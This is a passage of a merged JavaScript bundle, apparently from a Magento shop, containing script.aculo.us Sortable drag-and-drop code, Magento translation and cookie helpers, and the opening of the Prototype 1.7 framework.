      scrollSpeed: options.scrollSpeed,
      scrollSensitivity: options.scrollSensitivity,
      delay:       options.delay,
      ghosting:    options.ghosting,
      constraint:  options.constraint,
      handle:      options.handle };

    if(options.starteffect)
      options_for_draggable.starteffect = options.starteffect;

    if(options.reverteffect)
      options_for_draggable.reverteffect = options.reverteffect;
    else
      if(options.ghosting) options_for_draggable.reverteffect = function(element) {
        element.style.top  = 0;
        element.style.left = 0;
      };

    if(options.endeffect)
      options_for_draggable.endeffect = options.endeffect;

    if(options.zindex)
      options_for_draggable.zindex = options.zindex;

    // build options for the droppables
    var options_for_droppable = {
      overlap:     options.overlap,
      containment: options.containment,
      tree:        options.tree,
      hoverclass:  options.hoverclass,
      onHover:     Sortable.onHover
    };

    var options_for_tree = {
      onHover:      Sortable.onEmptyHover,
      overlap:      options.overlap,
      containment:  options.containment,
      hoverclass:   options.hoverclass
    };

    // fix for gecko engine
    Element.cleanWhitespace(element);

    options.draggables = [];
    options.droppables = [];

    // drop on empty handling
    if(options.dropOnEmpty || options.tree) {
      Droppables.add(element, options_for_tree);
      options.droppables.push(element);
    }

    (options.elements || this.findElements(element, options) || []).each( function(e,i) {
      var handle = options.handles ? $(options.handles[i]) :
        (options.handle ? $(e).select('.' + options.handle)[0] : e);
      options.draggables.push(
        new Draggable(e, Object.extend(options_for_draggable, { handle: handle })));
      Droppables.add(e, options_for_droppable);
      if(options.tree) e.treeNode = element;
      options.droppables.push(e);
    });

    if(options.tree) {
      (Sortable.findTreeElements(element, options) || []).each( function(e) {
        Droppables.add(e, options_for_tree);
        e.treeNode = element;
        options.droppables.push(e);
      });
    }

    // keep reference
    this.sortables[element.identify()] = options;

    // for onupdate
    Draggables.addObserver(new SortableObserver(element, options.onUpdate));

  },

  // return all suitable-for-sortable elements in a guaranteed order
  findElements: function(element, options) {
    return Element.findChildren(
      element, options.only, options.tree ? true : false, options.tag);
  },

  findTreeElements: function(element, options) {
    return Element.findChildren(
      element, options.only, options.tree ? true : false, options.treeTag);
  },

  onHover: function(element, dropon, overlap) {
    if(Element.isParent(dropon, element)) return;

    if(overlap > .33 && overlap < .66 && Sortable.options(dropon).tree) {
      return;
    } else if(overlap>0.5) {
      Sortable.mark(dropon, 'before');
      if(dropon.previousSibling != element) {
        var oldParentNode = element.parentNode;
        element.style.visibility = "hidden"; // fix gecko rendering
        dropon.parentNode.insertBefore(element, dropon);
        if(dropon.parentNode!=oldParentNode)
          Sortable.options(oldParentNode).onChange(element);
        Sortable.options(dropon.parentNode).onChange(element);
      }
    } else {
      Sortable.mark(dropon, 'after');
      var nextElement = dropon.nextSibling || null;
      if(nextElement != element) {
        var oldParentNode = element.parentNode;
        element.style.visibility = "hidden"; // fix gecko rendering
        dropon.parentNode.insertBefore(element, nextElement);
        if(dropon.parentNode!=oldParentNode)
          Sortable.options(oldParentNode).onChange(element);
        Sortable.options(dropon.parentNode).onChange(element);
      }
    }
  },

  onEmptyHover: function(element, dropon, overlap) {
    var oldParentNode = element.parentNode;
    var droponOptions = Sortable.options(dropon);

    if(!Element.isParent(dropon, element)) {
      var index;

      var children = Sortable.findElements(dropon, {tag: droponOptions.tag, only: droponOptions.only});
      var child = null;

      if(children) {
        var offset = Element.offsetSize(dropon, droponOptions.overlap) * (1.0 - overlap);

        for (index = 0; index < children.length; index += 1) {
          if (offset - Element.offsetSize (children[index], droponOptions.overlap) >= 0) {
            offset -= Element.offsetSize (children[index], droponOptions.overlap);
          } else if (offset - (Element.offsetSize (children[index], droponOptions.overlap) / 2) >= 0) {
            child = index + 1 < children.length ? children[index + 1] : null;
            break;
          } else {
            child = children[index];
            break;
          }
        }
      }

      dropon.insertBefore(element, child);

      Sortable.options(oldParentNode).onChange(element);
      droponOptions.onChange(element);
    }
  },

  unmark: function() {
    if(Sortable._marker) Sortable._marker.hide();
  },

  mark: function(dropon, position) {
    // mark on ghosting only
    var sortable = Sortable.options(dropon.parentNode);
    if(sortable && !sortable.ghosting) return;

    if(!Sortable._marker) {
      Sortable._marker =
        ($('dropmarker') || Element.extend(document.createElement('DIV'))).
          hide().addClassName('dropmarker').setStyle({position:'absolute'});
      document.getElementsByTagName("body").item(0).appendChild(Sortable._marker);
    }
    var offsets = dropon.cumulativeOffset();
    Sortable._marker.setStyle({left: offsets[0]+'px', top: offsets[1] + 'px'});

    if(position=='after')
      if(sortable.overlap == 'horizontal')
        Sortable._marker.setStyle({left: (offsets[0]+dropon.clientWidth) + 'px'});
      else
        Sortable._marker.setStyle({top: (offsets[1]+dropon.clientHeight) + 'px'});

    Sortable._marker.show();
  },

  _tree: function(element, options, parent) {
    var children = Sortable.findElements(element, options) || [];

    for (var i = 0; i < children.length; ++i) {
      var match = children[i].id.match(options.format);

      if (!match) continue;

      var child = {
        id: encodeURIComponent(match ? match[1] : null),
        element: element,
        parent: parent,
        children: [],
        position: parent.children.length,
        container: $(children[i]).down(options.treeTag)
      };

      /* Get the element containing the children and recurse over it */
      if (child.container)
        this._tree(child.container, options, child);

      parent.children.push (child);
    }

    return parent;
  },

  tree: function(element) {
    element = $(element);
    var sortableOptions = this.options(element);
    var options = Object.extend({
      tag: sortableOptions.tag,
      treeTag: sortableOptions.treeTag,
      only: sortableOptions.only,
      name: element.id,
      format: sortableOptions.format
    }, arguments[1] || { });

    var root = {
      id: null,
      parent: null,
      children: [],
      container: element,
      position: 0
    };

    return Sortable._tree(element, options, root);
  },

  /* Construct a [i] index for a particular node */
  _constructIndex: function(node) {
    var index = '';
    do {
      if (node.id) index = '[' + node.position + ']' + index;
    } while ((node = node.parent) != null);
    return index;
  },

  sequence: function(element) {
    element = $(element);
    var options = Object.extend(this.options(element), arguments[1] || { });

    return $(this.findElements(element, options) || []).map( function(item) {
      return item.id.match(options.format) ? item.id.match(options.format)[1] : '';
    });
  },

  setSequence: function(element, new_sequence) {
    element = $(element);
    var options = Object.extend(this.options(element), arguments[2] || { });

    var nodeMap = { };
    this.findElements(element, options).each( function(n) {
        if (n.id.match(options.format))
            nodeMap[n.id.match(options.format)[1]] = [n, n.parentNode];
        n.parentNode.removeChild(n);
    });

    new_sequence.each(function(ident) {
      var n = nodeMap[ident];
      if (n) {
        n[1].appendChild(n[0]);
        delete nodeMap[ident];
      }
    });
  },

  serialize: function(element) {
    element = $(element);
    var options = Object.extend(Sortable.options(element), arguments[1] || { });
    var name = encodeURIComponent(
      (arguments[1] && arguments[1].name) ? arguments[1].name : element.id);

    if (options.tree) {
      return Sortable.tree(element, arguments[1]).children.map( function (item) {
        return [name + Sortable._constructIndex(item) + "[id]=" +
                encodeURIComponent(item.id)].concat(item.children.map(arguments.callee));
      }).flatten().join('&');
    } else {
      return Sortable.sequence(element, arguments[1]).map( function(item) {
        return name + "[]=" + encodeURIComponent(item);
      }).join('&');
    }
  }
};

// Returns true if child is contained within element
Element.isParent = function(child, element) {
  if (!child.parentNode || child == element) return false;
  if (child.parentNode == element) return true;
  return Element.isParent(child.parentNode, element);
};

Element.findChildren = function(element, only, recursive, tagName) {
  if(!element.hasChildNodes()) return null;
  tagName = tagName.toUpperCase();
  if(only) only = [only].flatten();
  var elements = [];
  $A(element.childNodes).each( function(e) {
    if(e.tagName && e.tagName.toUpperCase()==tagName &&
      (!only || (Element.classNames(e).detect(function(v) { return only.include(v) }))))
        elements.push(e);
    if(recursive) {
      var grandchildren = Element.findChildren(e, only, recursive, tagName);
      if(grandchildren) elements.push(grandchildren);
    }
  });

  return (elements.length>0 ? elements.flatten() : []);
};

Element.offsetSize = function (element, type) {
  return element['offset' + ((type=='vertical' || type=='height') ? 'Height' : 'Width')];
};
//<![CDATA[
Mage.Cookies.path     = '/';
Mage.Cookies.domain   = '.www.booenn.com';
//]]>
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magento.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magento.com for more information.
 *
 * @category    Mage
 * @package     js
 * @copyright   Copyright (c) 2006-2015 X.commerce, Inc. (http://www.magento.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */

var Translate = Class.create();
Translate.prototype = {
    initialize: function(data){
        this.data = $H(data);
    },

    translate : function(){
        var args = arguments;
        var text = arguments[0];

        if(this.data.get(text)){
            return this.data.get(text);
        }
        return text;
    },
    add : function() {
        if (arguments.length > 1) {
            this.data.set(arguments[0], arguments[1]);
        } else if (typeof arguments[0] =='object') {
            $H(arguments[0]).each(function (pair){
                this.data.set(pair.key, pair.value);
            }.bind(this));
        }
    }
}

/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magento.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magento.com for more information.
 *
 * @category    Mage
 * @package     js
 * @copyright   Copyright (c) 2006-2015 X.commerce, Inc. (http://www.magento.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */
// old school cookie functions grabbed off the web

if (!window.Mage) var Mage = {};

Mage.Cookies = {};
Mage.Cookies.expires  = null;
Mage.Cookies.path     = '/';
Mage.Cookies.domain   = null;
Mage.Cookies.secure   = false;
Mage.Cookies.set = function(name, value){
     var argv = arguments;
     var argc = arguments.length;
     var expires = (argc > 2) ? argv[2] : Mage.Cookies.expires;
     var path = (argc > 3) ? argv[3] : Mage.Cookies.path;
     var domain = (argc > 4) ? argv[4] : Mage.Cookies.domain;
     var secure = (argc > 5) ? argv[5] : Mage.Cookies.secure;
     document.cookie = name + "=" + escape (value) +
       ((expires == null) ? "" : ("; expires=" + expires.toGMTString())) +
       ((path == null) ? "" : ("; path=" + path)) +
       ((domain == null) ? "" : ("; domain=" + domain)) +
       ((secure == true) ? "; secure" : "");
};

Mage.Cookies.get = function(name){
    var arg = name + "=";
    var alen = arg.length;
    var clen = document.cookie.length;
    var i = 0;
    var j = 0;
    while(i < clen){
        j = i + alen;
        if (document.cookie.substring(i, j) == arg)
            return Mage.Cookies.getCookieVal(j);
        i = document.cookie.indexOf(" ", i) + 1;
        if(i == 0)
            break;
    }
    return null;
};

Mage.Cookies.clear = function(name) {
  if(Mage.Cookies.get(name)){
    document.cookie = name + "=" +
    "; expires=Thu, 01-Jan-70 00:00:01 GMT";
  }
};

Mage.Cookies.getCookieVal = function(offset){
   var endstr = document.cookie.indexOf(";", offset);
   if(endstr == -1){
       endstr = document.cookie.length;
   }
   return unescape(document.cookie.substring(offset, endstr));
};

/*  Prototype JavaScript framework, version 1.7
 *  (c) 2005-2010 Sam Stephenson
 *
 *  Prototype is freely distributable under the terms of an MIT-style license.
 *  For details, see the Prototype web site: http://www.prototypejs.org/
 *
 *--------------------------------------------------------------------------*/

var Prototype = {

  Version: '1.7',

  Browser: (function(){
    var ua = navigator.userAgent;
    var isOpera = Object.prototype.toString.call(window.opera) == '[object Opera]';
    return {
      IE:             !!window.attachEvent && !isOpera,
      Opera:          isOpera,
      WebKit:         ua.indexOf('AppleWebKit/') > -1,
      Gecko:          ua.indexOf('Gecko') > -1 && ua.indexOf('KHTML') === -1,
      MobileSafari:   /Apple.*Mobile/.test(ua)
    }
  })(),

  BrowserFeatures: {
    XPath: !!document.evaluate,

    SelectorsAPI: !!document.querySelector,

    ElementExtensions: (function() {
      var constructor = window.Element || window.HTMLElement;
      return !!(constructor && constructor.prototype);
    })(),
    SpecificElementExtensions: (function() {
      if (typeof window.HTMLDivElement !== 'undefined')
        return true;

      var div = document.createElement('div'),
          form = document.createElement('form'),
          isSupported = false;

      if (div['__proto__'] && (div['__proto__'] !== form['__proto__'])) {
        isSupported = true;
      }

      div = form = null;

      return isSupported;
    })()
  },

  ScriptFragment: '<script[^>]*>([\\S\\s]*?)<\/script>',
  JSONFilter: /^\/\*-secure-([\s\S]*)\*\/\s*$/,

  emptyFunction: function() { },

  K: function(x) { return x }
};

if (Prototype.Browser.MobileSafari)
  Prototype.BrowserFeatures.SpecificElementExtensions = false;


var Abstract = { };


var Try = {
  these: function() {
    var returnValue;

    for (var i = 0, length = arguments.length; i < length; i++) {
      var lambda = arguments[i];
      try {
        returnValue = lambda();
        break;
      } catch (e) { }
    }

    return returnValue;
  }
};

/* Based on Alex Arnell's inheritance implementation. */

var Class = (function() {

  var IS_DONTENUM_BUGGY = (function(){
    for (var p in { toString: 1 }) {
      if (p === 'toString') return false;
    }
    return true;
  })();

  function subclass() {};
  function create() {
    var parent = null, properties = $A(arguments);
    if (Object.isFunction(properties[0]))
      parent = properties.shift();

    function klass() {
      this.initialize.apply(this, arguments);
    }

    Object.extend(klass, Class.Methods);
    klass.superclass = parent;
    klass.subclasses = [];

    if (parent) {
      subclass.prototype = parent.prototype;
      klass.prototype = new subclass;
      parent.subclasses.push(klass);
    }

    for (var i = 0, length = properties.length; i < length; i++)
      klass.addMethods(properties[i]);

    if (!klass.prototype.initialize)
      klass.prototype.initialize = Prototype.emptyFunction;

    klass.prototype.constructor = klass;
    return klass;
  }

  function addMethods(source) {
    var ancestor   = this.superclass && this.superclass.prototype,
        properties = Object.keys(source);

    if (IS_DONTENUM_BUGGY) {
      if (source.toString != Object.prototype.toString)
        properties.push("toString");
      if (source.valueOf != Object.prototype.valueOf)
        properties.push("valueOf");
    }

    for (var i = 0, length = properties.length; i < length; i++) {
      var property = properties[i], value = source[property];
      if (ancestor && Object.isFunction(value) &&
          value.argumentNames()[0] == "$super") {
        var method = value;
        value = (function(m) {
          return function() { return ancestor[m].apply(this, arguments); };
        })(property).wrap(method);

        value.valueOf = method.valueOf.bind(method);
        value.toString = method.toString.bind(method);
      }
      this.prototype[property] = value;
    }

    return this;
  }

  return {
    create: create,
    Methods: {
      addMethods: addMethods
    }
  };
})();
(function() {

  var _toString = Object.prototype.toString,
      NULL_TYPE = 'Null',
      UNDEFINED_TYPE = 'Undefined',
      BOOLEAN_TYPE = 'Boolean',
      NUMBER_TYPE = 'Number',
      STRING_TYPE = 'String',
      OBJECT_TYPE = 'Object',
      FUNCTION_CLASS = '[object Function]',
      BOOLEAN_CLASS = '[object Boolean]',
      NUMBER_CLASS = '[object Number]',
      STRING_CLASS = '[object String]',
      ARRAY_CLASS = '[object Array]',
      DATE_CLASS = '[object Date]',
      NATIVE_JSON_STRINGIFY_SUPPORT = window.JSON &&
        typeof JSON.stringify === 'function' &&
        JSON.stringify(0) === '0' &&
        typeof JSON.stringify(Prototype.K) === 'undefined';

  function Type(o) {
    switch(o) {
      case null: return NULL_TYPE;
      case (void 0): return UNDEFINED_TYPE;
    }
    var type = typeof o;
    switch(type) {
      case 'boolean': return BOOLEAN_TYPE;
      case 'number':  return NUMBER_TYPE;
      case 'string':  return STRING_TYPE;
    }
    return OBJECT_TYPE;
  }

  function extend(destination, source) {
    for (var property in source)
      destination[property] = source[property];
    return destination;
  }

  function inspect(object) {
    try {
      if (isUndefined(object)) return 'undefined';
      if (object === null) return 'null';
      return object.inspect ? object.inspect() : String(object);
    } catch (e) {
      if (e instanceof RangeError) return '...';
      throw e;
    }
  }

  function toJSON(value) {
    return Str('', { '': value }, []);
  }

  function Str(key, holder, stack) {
    var value = holder[key],
        type = typeof value;

    if (Type(value) === OBJECT_TYPE && typeof value.toJSON === 'function') {
      value = value.toJSON(key);
    }

    var _class = _toString.call(value);

    switch (_class) {
      case NUMBER_CLASS:
      case BOOLEAN_CLASS:
      case STRING_CLASS:
        value = value.valueOf();
    }

    switch (value) {
      case null: return 'null';
      case true: return 'true';
      case false: return 'false';
    }

    type = typeof value;
    switch (type) {
      case 'string':
        return value.inspect(true);
      case 'number':
        return isFinite(value) ? String(value) : 'null';
      case 'object':

        for (var i = 0, length = stack.length; i < length; i++) {
          if (stack[i] === value) { throw new TypeError(); }
        }
        stack.push(value);

        var partial = [];
        if (_class === ARRAY_CLASS) {
          for (var i = 0, length = value.length; i < length; i++) {
            var str = Str(i, value, stack);
            partial.push(typeof str === 'undefined' ? 'null' : str);
          }
          partial = '[' + partial.join(',') + ']';
        } else {
          var keys = Object.keys(value);
          for (var i = 0, length = keys.length; i < length; i++) {
            var key = keys[i], str = Str(key, value, stack);
            if (typeof str !== "undefined") {
               partial.push(key.inspect(true)+ ':' + str);
             }
          }
          partial = '{' + partial.join(',') + '}';
        }
        stack.pop();
        return partial;
    }
  }

  function stringify(object) {
    return JSON.stringify(object);
  }

  function toQueryString(object) {
    return $H(object).toQueryString();
  }

  function toHTML(object) {
    return object && object.toHTML ? object.toHTML() : String.interpret(object);
  }

  function keys(object) {
    if (Type(object) !== OBJECT_TYPE) { throw new TypeError(); }
    var results = [];
    for (var property in object) {
      if (object.hasOwnProperty(property)) {
        results.push(property);
      }
    }
    return results;
  }

  function values(object) {
    var results = [];
    for (var property in object)
      results.push(object[property]);
    return results;
  }

  function clone(object) {
    return extend({ }, object);
  }

  function isElement(object) {
    return !!(object && object.nodeType == 1);
  }

  function isArray(object) {
    return _toString.call(object) === ARRAY_CLASS;
  }

  var hasNativeIsArray = (typeof Array.isArray == 'function')
    && Array.isArray([]) && !Array.isArray({});

  if (hasNativeIsArray) {
    isArray = Array.isArray;
  }

  function isHash(object) {
    return object instanceof Hash;
  }

  function isFunction(object) {
    return _toString.call(object) === FUNCTION_CLASS;
  }

  function isString(object) {
    return _toString.call(object) === STRING_CLASS;
  }

  function isNumber(object) {
    return _toString.call(object) === NUMBER_CLASS;
  }

  function isDate(object) {
    return _toString.call(object) === DATE_CLASS;
  }

  function isUndefined(object) {
    return typeof object === "undefined";
  }

  extend(Object, {
    extend:        extend,
    inspect:       inspect,
    toJSON:        NATIVE_JSON_STRINGIFY_SUPPORT ? stringify : toJSON,
    toQueryString: toQueryString,
    toHTML:        toHTML,
    keys:          Object.keys || keys,
    values:        values,
    clone:         clone,
    isElement:     isElement,
    isArray:       isArray,
    isHash:        isHash,
    isFunction:    isFunction,
    isString:      isString,
    isNumber:      isNumber,
    isDate:        isDate,
    isUndefined:   isUndefined
  });
})();
Object.extend(Function.prototype, (function() {
  var slice = Array.prototype.slice;

  function update(array, args) {
    var arrayLength = array.length, length = args.length;
    while (length--) array[arrayLength + length] = args[length];
    return array;
  }

  function merge(array, args) {
    array = slice.call(array, 0);
    return update(array, args);
  }

  function argumentNames() {
    var names = this.toString().match(/^[\s\(]*function[^(]*\(([^)]*)\)/)[1]
      .replace(/\/\/.*?[\r\n]|\/\*(?:.|[\r\n])*?\*\//g, '')
      .replace(/\s+/g, '').split(',');
    return names.length == 1 && !names[0] ? [] : names;
  }

  function bind(context) {
    if (arguments.length < 2 && Object.isUndefined(arguments[0])) return this;
    var __method = this, args = slice.call(arguments, 1);
    return function() {
      var a = merge(args, arguments);
      return __method.apply(context, a);
    }
  }

  function bindAsEventListener(context) {
    var __method = this, args = slice.call(arguments, 1);
    return function(event) {
      var a = update([event || window.event], args);
      return __method.apply(context, a);
    }
  }

  function curry() {
    if (!arguments.length) return this;
    var __method = this, args = slice.call(arguments, 0);
    return function() {
      var a = merge(args, arguments);
      return __method.apply(this, a);
    }
  }

  function delay(timeout) {
    var __method = this, args = slice.call(arguments, 1);
    timeout = timeout * 1000;
    return window.setTimeout(function() {
      return __method.apply(__method, args);
    }, timeout);
  }

  function defer() {
    var args = update([0.01], arguments);
    return this.delay.apply(this, args);
  }

  function wrap(wrapper) {
    var __method = this;
    return function() {
      var a = update([__method.bind(this)], arguments);
      return wrapper.apply(this, a);
    }
  }

  function methodize() {
    if (this._methodized) return this._methodized;
    var __method = this;
    return this._methodized = function() {
      var a = update([this], arguments);
      return __method.apply(null, a);
    };
  }

  return {
    argumentNames:       argumentNames,
    bind:                bind,
    bindAsEventListener: bindAsEventListener,
    curry:               curry,
    delay:               delay,
    defer:               defer,
    wrap:                wrap,
    methodize:           methodize
  }
})());



(function(proto) {


  function toISOString() {
    return this.getUTCFullYear() + '-' +
      (this.getUTCMonth() + 1).toPaddedString(2) + '-' +
      this.getUTCDate().toPaddedString(2) + 'T' +
      this.getUTCHours().toPaddedString(2) + ':' +
      this.getUTCMinutes().toPaddedString(2) + ':' +
      this.getUTCSeconds().toPaddedString(2) + 'Z';
  }


  function toJSON() {
    return this.toISOString();
  }

  if (!proto.toISOString) proto.toISOString = toISOString;
  if (!proto.toJSON) proto.toJSON = toJSON;

})(Date.prototype);


RegExp.prototype.match = RegExp.prototype.test;

RegExp.escape = function(str) {
  return String(str).replace(/([.*+?^=!:${}()|[\]\/\\])/g, '\\$1');
};
var PeriodicalExecuter = Class.create({
  initialize: function(callback, frequency) {
    this.callback = callback;
    this.frequency = frequency;
    this.currentlyExecuting = false;

    this.registerCallback();
  },

  registerCallback: function() {
    this.timer = setInterval(this.onTimerEvent.bind(this), this.frequency * 1000);
  },

  execute: function() {
    this.callback(this);
  },

  stop: function() {
    if (!this.timer) return;
    clearInterval(this.timer);
    this.timer = null;
  },

  onTimerEvent: function() {
    if (!this.currentlyExecuting) {
      try {
        this.currentlyExecuting = true;
        this.execute();
        this.currentlyExecuting = false;
      } catch(e) {
        this.currentlyExecuting = false;
        throw e;
      }
    }
  }
});
Object.extend(String, {
  interpret: function(value) {
    return value == null ? '' : String(value);
  },
  specialChar: {
    '\b': '\\b',
    '\t': '\\t',
    '\n': '\\n',
    '\f': '\\f',
    '\r': '\\r',
    '\\': '\\\\'
  }
});

Object.extend(String.prototype, (function() {
  var NATIVE_JSON_PARSE_SUPPORT = window.JSON &&
    typeof JSON.parse === 'function' &&
    JSON.parse('{"test": true}').test;

  function prepareReplacement(replacement) {
    if (Object.isFunction(replacement)) return replacement;
    var template = new Template(replacement);
    return function(match) { return template.evaluate(match) };
  }

  function gsub(pattern, replacement) {
    var result = '', source = this, match;
    replacement = prepareReplacement(replacement);

    if (Object.isString(pattern))
      pattern = RegExp.escape(pattern);

    if (!(pattern.length || pattern.source)) {
      replacement = replacement('');
      return replacement + source.split('').join(replacement) + replacement;
    }

    while (source.length > 0) {
      if (match = source.match(pattern)) {
        result += source.slice(0, match.index);
        result += String.interpret(replacement(match));
        source  = source.slice(match.index + match[0].length);
      } else {
        result += source, source = '';
      }
    }
    return result;
  }

  function sub(pattern, replacement, count) {
    replacement = prepareReplacement(replacement);
    count = Object.isUndefined(count) ? 1 : count;

    return this.gsub(pattern, function(match) {
      if (--count < 0) return match[0];
      return replacement(match);
    });
  }

  function scan(pattern, iterator) {
    this.gsub(pattern, iterator);
    return String(this);
  }

  function truncate(length, truncation) {
    length = length || 30;
    truncation = Object.isUndefined(truncation) ? '...' : truncation;
    return this.length > length ?
      this.slice(0, length - truncation.length) + truncation : String(this);
  }

  function strip() {
    return this.replace(/^\s+/, '').replace(/\s+$/, '');
  }

  function stripTags() {
    return this.replace(/<\w+(\s+("[^"]*"|'[^']*'|[^>])+)?>|<\/\w+>/gi, '');
  }

  function stripScripts() {
    return this.replace(new RegExp(Prototype.ScriptFragment, 'img'), '');
  }

  function extractScripts() {
    var matchAll = new RegExp(Prototype.ScriptFragment, 'img'),
        matchOne = new RegExp(Prototype.ScriptFragment, 'im');
    return (this.match(matchAll) || []).map(function(scriptTag) {
      return (scriptTag.match(matchOne) || ['', ''])[1];
    });
  }

  function evalScripts() {
    return this.extractScripts().map(function(script) { return eval(script) });
  }

  function escapeHTML() {
    return this.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

  function unescapeHTML() {
    return this.stripTags().replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
  }


  function toQueryParams(separator) {
    var match = this.strip().match(/([^?#]*)(#.*)?$/);
    if (!match) return { };

    return match[1].split(separator || '&').inject({ }, function(hash, pair) {
      if ((pair = pair.split('='))[0]) {
        var key = decodeURIComponent(pair.shift()),
            value = pair.length > 1 ? pair.join('=') : pair[0];

        if (value != undefined) value = decodeURIComponent(value);

        if (key in hash) {
          if (!Object.isArray(hash[key])) hash[key] = [hash[key]];
          hash[key].push(value);
        }
        else hash[key] = value;
      }
      return hash;
    });
  }

  function toArray() {
    return this.split('');
  }

  function succ() {
    return this.slice(0, this.length - 1) +
      String.fromCharCode(this.charCodeAt(this.length - 1) + 1);
  }

  function times(count) {
    return count < 1 ? '' : new Array(count + 1).join(this);
  }

  function camelize() {
    return this.replace(/-+(.)?/g, function(match, chr) {
      return chr ? chr.toUpperCase() : '';
    });
  }

  function capitalize() {
    return this.charAt(0).toUpperCase() + this.substring(1).toLowerCase();
  }

  function underscore() {
    return this.replace(/::/g, '/')
               .replace(/([A-Z]+)([A-Z][a-z])/g, '$1_$2')
               .replace(/([a-z\d])([A-Z])/g, '$1_$2')
               .replace(/-/g, '_')
               .toLowerCase();
  }

  function dasherize() {
    return this.replace(/_/g, '-');
  }

  function inspect(useDoubleQuotes) {
    var escapedString = this.replace(/[\x00-\x1f\\]/g, function(character) {
      if (character in String.specialChar) {
        return String.specialChar[character];
      }
      return '\\u00' + character.charCodeAt().toPaddedString(2, 16);
    });
    if (useDoubleQuotes) return '"' + escapedString.replace(/"/g, '\\"') + '"';
    return "'" + escapedString.replace(/'/g, '\\\'') + "'";
  }

  function unfilterJSON(filter) {
    return this.replace(filter || Prototype.JSONFilter, '$1');
  }

  function isJSON() {
    var str = this;
    if (str.blank()) return false;
    str = str.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@');
    str = str.replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']');
    str = str.replace(/(?:^|:|,)(?:\s*\[)+/g, '');
    return (/^[\],:{}\s]*$/).test(str);
  }

  function evalJSON(sanitize) {
    var json = this.unfilterJSON(),
        cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
    if (cx.test(json)) {
      json = json.replace(cx, function (a) {
        return '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
      });
    }
    try {
      if (!sanitize || json.isJSON()) return eval('(' + json + ')');
    } catch (e) { }
    throw new SyntaxError('Badly formed JSON string: ' + this.inspect());
  }

  function parseJSON() {
    var json = this.unfilterJSON();
    return JSON.parse(json);
  }

  function include(pattern) {
    return this.indexOf(pattern) > -1;
  }

  function startsWith(pattern) {
    return this.lastIndexOf(pattern, 0) === 0;
  }

  function endsWith(pattern) {
    var d = this.length - pattern.length;
    return d >= 0 && this.indexOf(pattern, d) === d;
  }

  function empty() {
    return this == '';
  }

  function blank() {
    return /^\s*$/.test(this);
  }

  function interpolate(object, pattern) {
    return new Template(this, pattern).evaluate(object);
  }

  return {
    gsub:           gsub,
    sub:            sub,
    scan:           scan,
    truncate:       truncate,
    strip:          String.prototype.trim || strip,
    stripTags:      stripTags,
    stripScripts:   stripScripts,
    extractScripts: extractScripts,
    evalScripts:    evalScripts,
    escapeHTML:     escapeHTML,
    unescapeHTML:   unescapeHTML,
    toQueryParams:  toQueryParams,
    parseQuery:     toQueryParams,
    toArray:        toArray,
    succ:           succ,
    times:          times,
    camelize:       camelize,
    capitalize:     capitalize,
    underscore:     underscore,
    dasherize:      dasherize,
    inspect:        inspect,
    unfilterJSON:   unfilterJSON,
    isJSON:         isJSON,
    evalJSON:       NATIVE_JSON_PARSE_SUPPORT ? parseJSON : evalJSON,
    include:        include,
    startsWith:     startsWith,
    endsWith:       endsWith,
    empty:          empty,
    blank:          blank,
    interpolate:    interpolate
  };
})());

var Template = Class.create({
  initialize: function(template, pattern) {
    this.template = template.toString();
    this.pattern = pattern || Template.Pattern;
  },

  evaluate: function(object) {
    if (object && Object.isFunction(object.toTemplateReplacements))
      object = object.toTemplateReplacements();

    return this.template.gsub(this.pattern, function(match) {
      if (object == null) return (match[1] + '');

      var before = match[1] || '';
      if (before == '\\') return match[2];

      var ctx = object, expr = match[3],
          pattern = /^([^.[]+|\[((?:.*?[^\\])?)\])(\.|\[|$)/;

      match = pattern.exec(expr);
      if (match == null) return before;

      while (match != null) {
        var comp = match[1].startsWith('[') ? match[2].replace(/\\\\]/g, ']') : match[1];
        ctx = ctx[comp];
        if (null == ctx || '' == match[3]) break;
        expr = expr.substring('[' == match[3] ? match[1].length : match[0].length);
        match = pattern.exec(expr);
      }

      return before + String.interpret(ctx);
    });
  }
});
Template.Pattern = /(^|.|\r|\n)(#\{(.*?)\})/;

var $break = { };

var Enumerable = (function() {
  function each(iterator, context) {
    var index = 0;
    try {
      this._each(function(value) {
        iterator.call(context, value, index++);
      });
    } catch (e) {
      if (e != $break) throw e;
    }
    return this;
  }

  function eachSlice(number, iterator, context) {
    var index = -number, slices = [], array = this.toArray();
    if (number < 1) return array;
    while ((index += number) < array.length)
      slices.push(array.slice(index, index+number));
    return slices.collect(iterator, context);
  }

  function all(iterator, context) {
    iterator = iterator || Prototype.K;
    var result = true;
    this.each(function(value, index) {
      result = result && !!iterator.call(context, value, index);
      if (!result) throw $break;
    });
    return result;
  }

  function any(iterator, context) {
    iterator = iterator || Prototype.K;
    var result = false;
    this.each(function(value, index) {
      if (result = !!iterator.call(context, value, index))
        throw $break;
    });
    return result;
  }

  function collect(iterator, context) {
